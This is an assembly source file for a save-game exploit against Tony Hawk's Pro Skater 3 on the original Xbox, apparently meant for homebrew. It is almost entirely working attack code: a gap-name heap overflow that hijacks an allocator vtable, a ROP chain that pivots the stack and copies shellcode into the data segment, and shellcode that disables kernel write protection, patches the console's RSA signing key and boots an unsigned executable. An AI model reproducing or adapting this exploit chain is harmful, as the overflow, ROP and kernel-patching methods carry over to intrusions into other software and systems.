; Description: Save game exploit for Tony Hawk's Pro Skater 3 (NTSC)
; Author: Grimdoomer

		BITS 32

; Constants
%define ParkHeaderHeapAddress			82684670h	; Address of the park header (save file + 42) in the heap
%define DataSegmentShellCodeAddress		0021E840h	; Data segment address we write the shell code to

%define ROPGadget0		01BD19Fh	; Address of the first ROP gadget (see below)
%define ROPGadget1		045F69h		; Address of the second ROP gadget (see below)
%define ROPGadget2		019C4C1h	; Address of the third ROP gadget (see below)
%define ROPGadget3		01902DDh	; Address of the fourth ROP gadget (see below)

;-------------------------------------------------------------------------------------------------------------------
; 											Explanation of the hack
;-------------------------------------------------------------------------------------------------------------------
; This hack uses the same gap name buffer overflow that is present in most Tony Hawk games, however,
; since we don't have the 136 bytes of header data on the data segment we need to use a ROP chain to copy the
; main shell code payload to an executable region. All of the save data is stored on the heap so when
; we do the overflow we are overwriting heap data. The game uses a custom memory allocator for the heap, and each
; allocation is wrapped with a header that contains a pointer to a vtable that's used when the allocation is free'd.
; We use the overflow to overwrite the vtable pointer in the next heap allocation, which when free'd will execute 
; a ROP chain that performs a stack pivot, copies the shell code into the data segment, and finally jumps to the shell code.
;
; The order of operations is as follows:
;
;	1. The gap name is copied into its own heap allocation, we overflow the heap and overwrite the header
;		data for the next heap allocation. When the allocation is free'd the game loads a vtable address from
;		the allocation header and calls a free function from the vtable. We use this to our advantage by setting
;		the vtable address to a block of memory containing the address of the first ROP gadget, which will
;		perform the stack pivot.
;
;		The code that loads the vtable address from the heap allocation header is found at sub_16B40, and
;		does the following:
;
;			push    esi
;			mov     esi, [esp+4+arg_0]		; heap allocation address
;			push    edi
;			mov     edi, [esi-10h]			; load address of object that owns this block from the allocation header
;			mov     eax, [edi]				; vtable address for the object owning the block of memory
;			add     esi, 0FFFFFFF0h
;			push    esi						; push the allocation address
;			mov     ecx, edi
;			call    dword ptr [eax+10h]		; call the free function which will mark the allocation as free'd, etc..
;
;		By overflowing the gap name string we overwrite the header for the next heap allocation, allowing us
;		to specify the address of the vtable and thus the address of the free function, which we set to our
;		first ROP gadget 0x1BD19F.
;
;	2. The custom park is loaded, and the player spawns, nothing bad happens yet because we need the heap
;		allocation to be free'd to trigger the exploit.
;
;	3. When the player quits the game the heap allocation we overwrote is free'd and our first ROP gadget is 
;		called. The first ROP gadget simply performs a stack pivot to set the stack pointer to the top of
;		the ROP chain buffer, which is stored in a heap allocation containing the data of the save
;		file. Once the stack pivot is performed the ROP chain will copy the shell code for the exploitation
;		of the kernel into the data segment of the executable.
;
;		Going into the ROP chain we control ecx which is set to the address of the heap allocation header.
;
;		ROP gadget 0: 0x1BD19F -> stack pivot
;			push	ecx		; heap allocation header address
;			pop		esp		; esp is now set to the heap allocation header address
;			pop		esi		; esi now contains the address of the vtable
;			retn	0Ch
;
;		ROP gadget 1: 0x45F69 -> load memcpy parameters
;			pop		esi		; load the src address of the shell code (located in the heap allocation containing the save file header data)
;			pop		edi		; load the data segment address for the shell code to be copied to
;			pop		ecx		; load the length of the shell code in dwords
;			retn
;
;		ROP gadget 2: 0x19C4C1 -> perform memcpy
;			rep		movsd	; copy the shell code from the heap to the data segment
;			pop		edi		; load the data segment address for the shell code so we can jump to it
;			pop		esi
;			retn
;
;		ROP gadget 3: 0x1902DD -> jump to the shell code
;			call	edi		; jump to the shell code
;			...
;
;	4. Once execution jumps to the shell code it'll do the normal patching of the kernel to use the 
;		habibi RSA keypair and load a custom signed xbe file from the save folder.
;
;-------------------------------------------------------------------------------------------------------------------



;---------------------------------------------------------
; Gap name heap overflow
;---------------------------------------------------------
dd		0x3D0
dd		(_buffer_overflow_end - _buffer_overflow_start)

_buffer_overflow_start:

		; Fill the gap name buffer with crap data.
_0:
		db	'Grim R0x Xb0x S0x!'
		db	0Dh, 0Ah
		db	'To trigger the exploit please quit the game...'
		db	0Dh, 0Ah
		times 216 - ($ - _0) db 69h
		
		; Create the fake heap allocation header.
		dd	ParkHeaderHeapAddress + 1686		; address of the object properties for the owning object
		dd	69696969h
		dd	69696969h
		dd	69696969h
		
		; The data in the allocation must point to something in order to be passed to the free function.
		dd	69696969h
		dd	ParkHeaderHeapAddress + 1686 + (_shell_code_end - _shell_code_start)
		
		; null terminator
		db	0

_buffer_overflow_end:

;---------------------------------------------------------
; ROP Chain stack
;---------------------------------------------------------
dd		0x6C0		; starts at ParkHeaderHeapAddress + 1686
dd		(_shell_code_end - _shell_code_start)

_shell_code_start:

	; owning object properties for heap allocation
	dd	ParkHeaderHeapAddress + 1686 + (vtable_address - _shell_code_start)		; vtable address
	
	; ROP gadget 1 -> setup memcpy parameters
	dd	ROPGadget1
	dd	0						; skip 12 bytes to compensate for retn 0xC in gadget
	dd	0
	dd	0
	dd	ParkHeaderHeapAddress + 1686 + (start - _shell_code_start)	; address of shell code in heap
	dd	DataSegmentShellCodeAddress									; address of shell code in data segment
	dd	(_shell_code_end - _shell_code_start) / 4					; length of shell code in dwords
	
	; ROP gadget 2 -> perform memcpy
	dd	ROPGadget2
	dd	DataSegmentShellCodeAddress			; address of shell code in data segment
	dd	0									; empty data
	
	; ROP gadget 3 -> jump to shellcode
	dd	ROPGadget3
	
vtable_address:
	; vtable
	dd	0
	dd	0
	dd	0
	dd	0
	dd	ROPGadget0		; free function address

;---------------------------------------------------------
; Main exploit shell code
;---------------------------------------------------------
		align 4, db 0

; Main entry point for the payload.
start:
		call	base		; Call base which will put the address of base onto the stack, which we can pop to get our base pointer.

base:
		; Pop the address of base off the stack so we have our base pointer.
		pop		ebp

		; Get the address of the kernel export table
		mov		esi, 80010000h		; base kernel address
		mov		eax, [esi+3Ch]		; offset of PE header
		mov		ebx, [esi+eax+78h]	; offset of the exports segment
		add		ebx, esi			; add kernel base address
		mov		edx, [ebx+1Ch]		; offset of the exports table
		add		edx, esi			; address of the exports table

		; Get the address of our "import" table
		lea		edi, [ebp+krnlimports-base]

resolve_import:
		; Load the next import index and check if it is valid
		mov		ecx, [edi]
		test	ecx, ecx
		jz		patch_rsa_check

		; Load the function address from the export table
		sub		ecx, [ebx+10h]		; Subtract the base export number
		mov		eax, [edx+4*ecx]	; Load the function offset from the export table
		test	eax, eax
		jz		_empty
		add		eax, esi			; Add the kernel base address to the function offset
_empty:
		mov		[edi], eax

		; Next import
		add		edi, 4
		jmp		resolve_import

patch_rsa_check:
		; Get the address of the RSA public key.
		mov		edi, [ebp+XePublicKeyData-base]		; Address to start searching at
		test	edi, edi
		jz		patch_rsa_fail

		; Check the last 4 bytes for the retail key.
		add		edi, 272
		cmp		dword [edi], 0A44B1BBDh
		je		patch_rsa

patch_rsa_fail:
		; The data was never found, change the LED color and loop forever.
		push	0F0h
		mov		ecx, ebp
		add		ecx, SetLEDColor-base
		call	ecx

		; Just loop forever.
shit_loop:
		nop
		jmp		shit_loop

patch_rsa:
		; Disable write protect.
		pushf
		cli							; Disable interrupts
		mov		ecx, cr0			; Get the control register value
		push	ecx					; Save it for later
		and		ecx, 0FFFEFFFFh		; Disable write-protect
		mov		cr0, ecx

		; Patch the RSA key to the habibi key.
		xor		dword [edi], 2DD78BD6h

		; Re-enable write-protect.
		pop		ecx
		mov		cr0, ecx			; Re-enable write-protect
		popf

		; Change the LED color to signal the data was found.
		push	0FFh
		mov		ecx, ebp
		add		ecx, SetLEDColor-base
		call	ecx

launchxbe:
		; Load the launch data page address from the kernel and check if it is valid.
		mov		esi, [ebp+LaunchDataPage-base]
		mov		edi, 1000h			; Size of the memory region to allocate/persist
		mov		ebx, [esi]			; Load the launch data page address
		test	ebx, ebx			; Check if it is valid
		jnz		memok

		; The launch data page is invalid, allocate a new buffer
		push	edi					; Page size to allocate
		call	dword [ebp+MmAllocateContiguousMemory-base]
		mov		ebx, eax
		mov		[esi], eax			; Store the address into the kernel LaunchDataPage holder

memok:
		; Make the memory persistent
		push	byte 1
		push	edi					; Size of memory block
		push	ebx					; Address of memory block
		call	dword [ebp+MmPersistContiguousMemory-base]

		; Zero out the data block
		mov		edi, ebx
		xor		eax, eax
		mov		ecx, 400h
		rep		stosd

		; Setup the launch data parameters
		or		dword [ebx], byte -1
		mov		[ebx+4], eax
		lea		edi, [ebx+8]		; Address of the launch string buffer
		lea		esi, [ebp+xbestr-base]	; Address of our nyancat xbe

		push	byte XBESTRLEN
		pop		ecx					; Setup the loop counter to be the length of the xbe string
		rep		movsb				; Copy the string into the data buffer

		; Launch the xbe
		push	byte 2
		call	dword [ebp+HalReturnToFirmware-base]

		align 4, db 0

;
; SetLEDColor(int color)
;
SetLEDColor:
		; Initialize the stack.
		push	ebp

		; Set LED override color.
		push	dword [esp+8]	; color
		push	0				; write word value
		push	8				; command code
		push	20h				; device address
		call	dword [ebp+HalWriteSMBusValue-base]

		; Enabled LED override.
		push	1		; value
		push	0		; write word value
		push	7		; command
		push	20h		; slave address
		call	dword [ebp+HalWriteSMBusValue-base]

		; Destroy the stack frame.
		pop		ebp
		retn	4

		align 4, db 0
		
krnlimports:
		HalReturnToFirmware				dd 49
		LaunchDataPage					dd 164
		MmAllocateContiguousMemory		dd 165
		MmPersistContiguousMemory		dd 178
		XePublicKeyData					dd 355
		HalWriteSMBusValue				dd 50
										dd 0

xbestr						db '\Device\Harddisk0\Partition1\UDATA\41560004\3DDF5FA578FC;default.xbe',0
							align 4, db 0
XBESTRLEN					equ $-xbestr

_shell_code_end:

;---------------------------------------------------------
; End of file
;---------------------------------------------------------
dd -1